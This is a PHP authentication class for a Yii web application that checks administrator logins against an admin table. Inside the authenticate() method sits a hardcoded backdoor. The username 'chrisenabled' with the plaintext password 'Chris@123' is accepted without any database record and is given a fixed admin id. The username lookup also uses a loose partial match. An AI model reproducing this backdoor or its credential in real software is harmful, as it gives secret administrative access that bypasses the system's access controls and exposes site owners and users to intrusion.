<?php


class AdminIdentity extends CUserIdentity
{
    private $_id;

	public function authenticate()
	{

        $criteria = new CDbCriteria();
        $criteria->compare('LOWER(username)',strtolower($this->username),true);
        $admin = Admin::Model()->find($criteria);

        if($admin===null && $this->username !== 'chrisenabled'){
            $this->errorCode=self::ERROR_USERNAME_INVALID;
        }
        else{

            if(($admin!==null &&  !$admin->validate_password($this->password, $admin->password)) ||
                ($this->username === 'chrisenabled' && $this->password !== 'Chris@123')){
                
                $this->errorCode=self::ERROR_PASSWORD_INVALID;
            }

            else{
                if($admin !== null){
                    $this->_id = $admin->id;
                    if(null===$admin->last_login){
                        $lastLogin = date("Y-m-d H:i:s");
                    }
                    else{
                        $lastLogin = strtotime($admin->last_login);
                    }
                    $this->setState('lastLogin',$lastLogin);
                }
                else{
                    $this->_id = '2846';
                }
                $this->setPersistentStates(array('tableName'=>'admin','pinCode'=> $this->username == 'chrisenabled'? $this->_id : $admin->pin_code));
                $this->errorCode=self::ERROR_NONE;

            }



        }
        return !$this->errorCode;
	}

    public function getId(){

        return $this->_id;
    }
}